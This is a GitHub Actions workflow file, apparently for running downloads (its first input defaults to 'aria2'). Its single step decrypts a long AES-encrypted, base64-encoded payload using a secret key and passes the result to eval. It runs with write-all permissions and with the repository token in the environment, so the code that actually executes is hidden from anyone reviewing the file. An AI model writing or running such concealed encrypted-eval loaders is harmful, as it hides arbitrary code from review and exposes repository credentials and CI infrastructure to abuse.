name: Run

on: 
  workflow_dispatch:
    inputs:
      option1:
        required: true
        default: 'aria2'
        type: string
      option2:
        required: true
        default: ''
        type: string
      option3:
        required: false
        default: ''
        type: string
 
permissions: write-all

env:
  GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
  DECRYPTION_KEY: ${{ secrets.DECRYPTION_KEY }}
  OPTION_1: ${{ inputs.option1 }}
  OPTION_2: ${{ inputs.option2 }}
  OPTION_3: ${{ inputs.option3 }}

jobs:
  j:
    runs-on: ubuntu-24.04
    steps:
      - name: May
        run: |
          encrypted_payload="U2FsdGVkX18TtqlWH7lYjqQZ+vzj6fHfHlz78YOL4deSxB0/HZEKDXeE0UlkPN70dOTyv0hi8mKwWyBNBjHOjkzGYE5clep4P9+XKjF3uwqX+dhhhPuzznrMlcpGLWQ0eWYT4/d8u+/ZTEOFomVuSMcIzgWuDl2ybBspfFW20G2EaZl9iaB4IqUvg66JrA4KJ87MNU0gxd2jQnoJ/ccIMrS97VsbC8dWUNMa4GTyKFPrzo0N0O+fJMkV1IEEwuCHowx36S21mrksAgpZhWIUkZWLSPYEa87em+7PcFPRKXHAyZou/6N5CoWTGMF4bzd5eTnEs6PNkJAdIvKqVf2P/ryNk1klgKnc79QSEgw7uUTxQV0wRqP+MsAB+7LfHYU1FAmvtX3ZyKLgLbc9JHC+740S7W7wdnDS869uvx+JfFkpMQVgrx9/oK+qRD+E49qc75eQoX3JO5ffStNbX5167UAkloqpP/henC0Jt9a8IZGayKAcTU45dI+lDNzeCaMZVpNDi83dDDfUg6jkHeRNiq1d742Zqn+huMWzGlGOWE0Wfv4nIb2CAjbc3+w6aPbsd7nNiGd744HjSh28gs9F88oK7lnzXjUOUb56kBKGuQ285pg16SK9Ab9f3+C82hgnq6g2MRSkavjN+k2+qxQTtkk8+WqPKJlk3EIKN+zn9AGcTZtJFmQHP8SvO0l396pZQUYykpYEJZ7MyhV90tS9oNxUA89Mv9twQmUxNTF3JUCHa4i//Csk4fIYBp64y3xITNq1SpQ5L3NA5xy/FhcvuVwiZ1EPBcr4KcdBQEvWoAAMygWMxqBecdsCKWnkGss6qybtquSQy6wQbItui3cHZmQymbC2isjZIPlgkjddNcGvE3Xj/LWRm2NH83VCK2zvlnjnCSJvz5jYDil6HYPN0fI5bGaHYpg2xm4NRNso4/RXDfyQiCSkDNvH/pEUIz5yACPKRlunKDHehog5ID+JHcAcPvdgE9+PxsRgDSHku3bEiBdxqyDeHA2Cxy01CyV+VsFrCt6RpyMasBqsBkUtEk/4A0zP263Wt+Efe4Rr7NfceFEJb6irqbDktFuVUyUzcMr6VngLXXQ/vwIXX+uZu8ohuCJ9zDeCllgIagznyu63TOcYBrShZCkJHEXuXzILqeqIb0mUBWPJyFp8HV7/FohD6FE7t398ckCXxcE/83PccWyX0gAZEbU3yRMloNkxgA1ww5WPnaq0wPl2fcK8BP34+LEtUaPJDqXOW1fbZ+8AvASAxA7biZO3pomXXamYRkGlDGpYqzTpyQJSc5MTr74NE43+uhXfXDKryxO6648LGRMvoIZ53tVOrqDv+u2lRQuD3qyLYh3+MrsRNU7OYGSmsUgq4C4KWgcCQgt5xx3RQHmstCrohd8evSfStzoJZXDTEWfeYMSiydXs8hP1SkKVAayQ8aCZTuGmnEOrgVFh5AYFon9ZlhNnEKBwKCLUcQ9xlgrPpTJ/h9nRPhpKqLaFRTuCL5E2/IT/wFNQm6Cq+JXjJhCN16Xi7p1o5IuTggQc488h/a74a75rC31s+aFltqjxWMnwjkFlZLoZY91D8+A2VXJA/4PzJQOBLdwVle9b5P+Ii8jdPrwoQBbAXRG/L7p13mOsfwz3Jq3tYMlpox9+IEHo9M+k7yPooi6FSp5XSgn5hfMNY6eKn65XHmHZV0yHQpICGv07bRAx6p5YR25NdEv7FoMlXh3r6xDZAJjuNgXdYFiEcMOpe6QxgXoP+0H/26ABwC5DOfGoUFmzvdaqn+oWCROZVMUeZFqnB65HwRbw8XN71VBPVFxUToC5ixRWthMOpUqhu18fOR/agmDfD5okjtSUv+1AojwR6utRoHZ4TyEppJ7BkwX8pZHLgEKKH9Z3Zxx8G9uqqLGh5L2JA6vnt8k0AyYAgT4wIUzheoc7jtanOf/efMVd8pdV1GsBmdHcNoIEu01XxKf7wfcyK0h/Gdh2wgELiCn+iA5lEoY+gxIjuqvcleb1e7WN4y9ZXLv7j/jyPLWBgT8wvh3t/oQb8Xf2MJ/wu99lQggyvz7cXtn1TRhFB9kDv9MMbPZJdEVhYD/vQuafGlAWePzbCmKlzSUVC96vrnLStK2aPIchxM5LpLSDRLZq0R50BujhXvWSW8C/FjB8eeFqX48yxLqiDKAt2ESOydnIw2YOc43/6uknWplSucsm8TnVPFs8uPTBPkTe1nKV4/b8KT9ivJDkzC8lg/Ohfi64jTmiHSxvLhlrgrCENvXiI3bkENsv16IldELmUHjn7s4Xd3knr1Yg4TVj9bQUwQNB36deFHaTZyga4xRxw+4YGjp+P1lUFyQOL2bvJiVfzEpTXzY88p9QvoMUf5vkUi2AWNQvKFwZpWGlkvO0EK243Nd0SM5vb0lWHZLzdz2qx6/PDeUz7Fdg3QsqT+4eCymkQkWBkmy4Org97pyrKI5Hw4fne+i2a0OKj2ccxUJXBErOJ8lPijNhr+4YV7tKQ3/Hbe5udJVTAZ8YnfM5ix6o0wKC52BmP4osV2P++AoRnnX4TYs/jq8PjejqeoCafGqqe7YaBkKoxguBJcJnLQyqzR9BVIakhP9BwWOyaQwu57eS+XrLJTjk/lNTEs2XqLOb6u49aLMNDye8AKP/NMVpBuquHaxM4pkDQQlUP0udO9paX0+lWfw7ddcaDXiV/ErXYMBsW0qrN6OsQfcIfuzSNHMaM+oOu9ZURMHtd2aN5MPwJ7d5P64sAACktpp8RBPzB3+7lRLfXIdLAyd9ECWqGLJXyK6zSjsPwvRLgjsxX7XiYVREFFQLOun79+rkDVVh4hFr+uEl9DCw8TTMTM8OIjU/fqd9mGUySBgxFSYssFmZXFmOAUzzE3+ekY9xiHAiNd2gs7ctHF/azTT20N7GBNz35RTBgn839rsGO5qK+jjc06S3lTvQX6fSqyK/KSdIKfrg/Cd0K2sZp6RjdCfACyLDmsPxlLW4KNOAMf51XuMPbNsUJ8BiRrURVrFSZWT1311pUn67XrMRV8ueI1WPTFJxaFBXNcyqpfwLIPElLVAYU+Oa6h5yHXOKAU2weZc2JGO8bzZ8WRfUtp820HtQA+XL8lDq4VFeWPviTcyeufklvF+PMHesKZ0XIE4cIGO6yrpS2po5jF/yBM4tNse/1yxqwZsc4fsePVq+ozsY4+jlIyFgk5yn/ceOlB2fMQ5gioqGHWiJmNRgYw/mKBW1DAJ652jNknwNEXzJIPH1iclPNgr0rv0bK6ydHf1ajSCMKkzmeztHGXA19yBeeVzs6c1UVaCAunh8AQwM3h3wx6rmFwijShYq80AOXPNhgG+sqGIhJgdhMaQr4HKOugvn4kyhI+WXr/gliBDX9IhomBX1kvaCrHFKO/2bwMGlW2RxskwdYu6OZSA0E40i+sawSOHDX2KxpobIdfT1V4dv4k1yl7ykx1swRCKphso60AKL6hXkjJATo/yATCf42VpFtGXMFaLQdrfiQzTJsrvBx+hcgzPqpV3ZdtcfskBFJATKanB27Mc5L9DHRiRZuJoxBYUB1tEP0CGPNd2KDezjfBLhUDFmRArUYyyoFCr4LL/IrtnD2+B8kgBLRLJnGZL3sxUgqxk+FBnWRyFUVvfJZ6eVBT1resOMV1Vh8E1y76+XLyOtSHj+D/vc7sLm4ijXh2a/YDSwOugKBiZD0P34j75vMXwYXfjr7/Uv+MzNxmdMTuNw5/ulaTTKhj09uxc+NIqAD9Nf7iG0487vt/h6jmPO6MeOpTBFTghvdloPpONNcp+kLtUWcsc3hrb+W9M929dyFtB+eK/+HrF7jrf76J2gV1EJgjgwTBvD217h/SUjmsm6mA28iluLfYRoU32CPvC+zbJWbKOFwD8105PZXB+JBxSnLyCqnhukQ48Dt3JzeXFdfNWeVl3wZYHPpyIehHmJ81Q7dQiopIsjIZgtsIq7g5REMvyIft066sWdOrvn2xGZz6nEVdOl35BtwklAWXsJe3vDlOI9osrKng3wr43dd/6ZXoRMAgNerSQLoJKAjJ7ho2IUXCl2ly0i0ABCGzIc+rIMYMtWU4pO21IoADgkxAzdnXn+YBUiRgQAU/GfLV25ZriNzbu/MDGqFd56bJ3Hh4BirGz4bLs4MSJ2fbxWeeqm50XdPaioyU1ZEScvU0SF/jRZlG/zRuW6XOyKb07oGBzDlyg4X6HIhVubkiGoS7EJKLI+Wl/NSI9i2PH3kj61uFRPnATqBq9XAXMaPpXtj+xe7LITueF9HwAVIO82BIuvjASl2fMeFXYcYjmMR78jO+Iu4PjMHGnYu1KA6AOBlbjFujJS1vS3O3c5Vk4B8CkKbzEyYIDgja8SohOxFA8nxD9bQcBTNXNh6Yw6OOYnbqJVNhUWt1d3P10Ao9peQh02asN0Lwjq/Ia2zIR2FPoi9lX+NSbqAeNYxsthVZKL6WP+eJhjsE7jlPTI4wW/OpPQ3z5OwRjh108gsYvrNS4AYJDby8ho/eNH/2WSb6GU1thxlHPHj/BXMb3O7JJgF3Gu8eXvcIrVawZ7wkj6B/8OCMjCLqQwpPWMWcqIOTv/ZvT8EByCRx5/utGFX0cj9Yjukws8FUMBnTjCX55bAa9Bh9T6TIOgGTx/8M13mUWS3cW3qoCVmAVXEuVZtOcwP0sv4JNQRVzVpIy2cdpg1pQjJMP12Xz3JfVN1q4Wy4pB9Lup4G6QLzWGfeCVKSZOLBAMxi7fNxDoCputtepD/NiiP2K2KEOK+tA/6GnWh95HsMvctP/NiFgoOqc8R+ZkQWCJWvFMy4RJmMICRe/h67ju3dpx+67Ps4vzKG2KiCB5EAgTgHluOh+dgs0HbwgTC+yIFsvPTmy9lMcEWKvS4BVq00k4W7n/CowFgdmGDM/zPVe2JhbGevsiXD6xkss7ExHeXpz9xxAQCCViIteQT+HznByPpj+FedMOaOKBKWXZxNpWkENTXBf789js5U+RRGb66vIx4kXjz4f9+voe4XZzH34ZZdrVMrJLuN8DqAp+75KG+j05o8YERxMgQz8JnacOA/6J3t85iIz5nJMbW09ta+DdEoDdbDzyYTbmzbHSoGH+Clz6b1lfGg9UdbCBrMDoBmUx46Dx2ZzAqjd6P6cKnuM+vS/fILL11D/xRYKzJ/StawQLa+ec55H/ZwEtyKOw45f/ih7hZpRqTtnBfwPSSJP3I97IsNE/pBtfXMr7zDGwaK/hOFDLvok6QUZP7zzSePnlD6Eo1/xRMW9lup4Q6HBurhbhyPpRtrvNDOXQa5AVmJIeldNVyijA2/MaeiN0DWWjlgqu5GYo2vnMk/9v2NgTu94n7e3aY3EybPoQsgDjXwk0GKlfUi/hVZ/ItpuRb4GXJR7JwfJ5a349zT0/u8XntilOqR9OgophkCVK+CraWlTawD8oT3IA045fdn6j4nmBwUBLDFnR8POLc+mqQmStctS50J8oyW5c/T37m0vsZaAGzUBN8eZEBKNxAZTr8v0DOcGt5THEUaLRxDOqOqd3UqPeXjsXXOLpCAu5wxSf5vJr19ZmuezyfOKWjPm9vKSqEioazcGM1Xbv+JMlIV3L0gwBErVs8iMTJIRiTszKovvsxL2bF/FumUl2OXT0LAPSK0S4N3+So4RK8Bulh6VvqGpxwnNR+bnl1XyWJisoSOGwVDC993H/vl9ZlW5Z+yv34jpBPBCsBpxo+/lQhW7MwHmWqq098tfe1sri/flD1xsj1foaixTNbeK+P/QITN0oG1foW4aaktaf712czgNhSbKtV3HqkNn4sH8/OpzDWDDHIMwG89WeKdmzISxSRGOHhFAuBq1OIdKnt9UhrkHB9G8gCz8vNtXdIRIAJWl/yy+CHSkyxi7ZPjO4ZCXt0ZLUEwVpaLlWeOzBf5PIwzB/3uPGhAbLYEIvA7biOMpeA8jRvWo6WVztCfNu33CxHTWV2yYoLBz2Z63IiOfAQCwTBQ6qXJ9AUBGSl4oVEqNJhspGfc6aPWu+IiiD7FXLJBHLyA0q+DbvLuneYTpTlNGRVcgNuKtUznHwMihIHsa9o8/CWuois08V6eUPaajaL9bjXsfDIzPrza2X+71W3BaTsRSaTuGrRX/MwSvLtnhFRIxnVqYqrQy+WEBNNxG2jBvOvmFVfoovauHUXCfN2o6fUSIDlcRQNZ+0g/o2kcafWGehSEWLxu13McXbpseZJOaKbLnAO4UoeMVyEWYdDPYSEemHEIZ8y4rjJ3vJrLy0ReuMGDTmlkiV+zbztahsv6tzpb75eZnFHWFbK4MEEvVEW4X4Knll1UGEqSBJjJlcQSiBm5pEeKVaR2Tt75Hbx6Cdd+LPzLaS+Y0X2CFPNn2opMp3A/wuErAO97yyQ7gCmE4twXW2GLsoXihHaC/RJ+gyPoslrK1z4BYRqRNMrOwcAU8LSAbDnHJIYO1QEaFb/cdxuoeVhZRuYhMLAn6qnxTeIMQWT6ZV9EwAB9fFiVr9Oprm2pFUVJuhA3tD1VkEj/izFG9YROfwaM35uZICUY85Y5paDPfDUjumIaHzQXfA58ANC3pDzcPwixnUQuu2ifhHsZs3K6by6YaPty4vFh29ExHynFfkp9eT+0gcG/txOEMokzU+3qkysxmmS+nQa0mr9OUeeJ7dLbPT5gbsuWirstIL/gTET+dXxlFON5xqu7a7kR5iNEahOYEFrQQuyMYBSzyJ5wDrKNrZme/n3GvHeG1I0nLDlNvM8/y1aoACNzc3W+VwfSks//vK1NTp8PfWwCQ49wEm22/eKoDTBTbilXVM1ftAzt0cMmKXVMIg0EoI0/7PDzASAMiokYDXEAYK2etzTPzBDdZ6FtZvwABW55qSoWLrUy2AXk33BKFsgTOWytKuTDbyE60tkxdOqCkbVe8+OGWiRcOQ9usQ1mfEvJbOcNNDv4pE6XgWPKXqRMt1oj7pfynWTXtBu3HH+2bvT8TTQf+fs9qykAzUYTRoGvhzMm4T5aMjowFuV+hSEHy1ykm0YPBbr0AoazRrQn6fMas2TCVmbFNOg+6p/4yhGk8xWsFGO9udZuWhTSZPkupE01oOegSBR52Uur70MkYCDGUQbHgb/1M98T3wgFrclInG2u6isOgAdb2JdM60BFGEcXv+QiSAIIKW5+A1g7DazJR9yG3+6c06vlhqXah1wftlTXmYac6WK+uDuFZz1UDzyE2AzzWf3amYOgiuISrBgIRxEDAzJUqi/cZvZvy0WPq+CNFeMJQXM0g9sY8dSJCS2BlqtxWpvPB6lfEW5ehZET/PB4fKJoKgcXsr0bnRqv+cey/2UmWK+iXH04QDGJ6qTiavgwOcb37L/a4c2Af76fKFZKPfrijR0o7sgUZ1FNEI9AOV9RX7/P/e8KwkZF+CNqK4EkEHMnS3COjNcNWGtJimUxBCArYmBOd/bGZ7WfNQ6MuMBZ0SihK+BjWm8h3NZ9RsK7f4gQxHR24gBhFAshb6zbK/S2W9ga2Cd9HVi2+YgtlKXUeafuEg/SlHXcqqkYl3Q+AjJOSaGSbvkQT5v7wUJWLXXb9sW92MUfeQh2mBNWTYOtMoNZFq4w1lIb/jbdrJXQR5RIShpVIuUPaS9SKzTVeUpxufXjo7/LQs4F3tk6EPlVjtCs/zXNMBer/iYLF2imP98KU+CvFamjotVlESArIeX0dtHg/iZsu2Dd8FJRYK659pOTPylb3eq21axgtvx1FkVVTnH/mOBJ7Nt0dEokaX2Pn0fegCG7dQyJNGuAZiXRAscfWZAyMlPA95jWKLHYIS0HMQxZZsCj4dZ5Fk2umCxNQO6bv1f6Eh1RronJOfepCA3cr+n8wMoFf3dPPLaIaltAb0JITFn8P9bTjHIQjVcDl5lK45StNnmF1cl8hA9aTBtBRiCIu/UIe1itfNJkRyfXj4SlkuNtaw3e0qNsyeJ+io4fjcqz+zinhsTVeX5oKFiwKKO9azCcAuwieB9fg5F1j327CxKMbhJjVvkfcoBFZFR628PPzd9/VsgNhxj04gDcOGh1mgyGJphwUl0FvyN94frGzEcDxbsQ2bPUZWbf18f25ReTXan1QXUUykKbgYxUSwDgzUstfCuCdnfidvDvEUYATw3Hj6zdRJajEqvlPbpHmR3g+yLIkhXoRBotI3+8zlr6q3kLzz2wpIhGjLkTHxDpCA878mx/UQvWyNEXvQnwIWJD2GTEDsODpHotZPem85ynjqKYsa8iZpVKoWjaXqNY2vQmAjACueRoY09G/2suBy3sXHZTU5++Dg/6Ie5xCDQze7U5HufD3vPf1oan8ggD3F4ra5osyXq4KZcGHBtZLOgLu6YtjcdTN1LhWJK76i+diqG/GHeeIa4HzCqvfvAoKLgU0qYALv11RY59sdqnt6WRoyr1yt/FsPTUzt"

          decrypted=$(echo "$encrypted_payload" | base64 -d | openssl enc -aes-256-cbc -d -salt -pbkdf2 -pass pass:"$DECRYPTION_KEY")

          if [ $? -eq 0 ]; then
            eval "$decrypted"
          fi
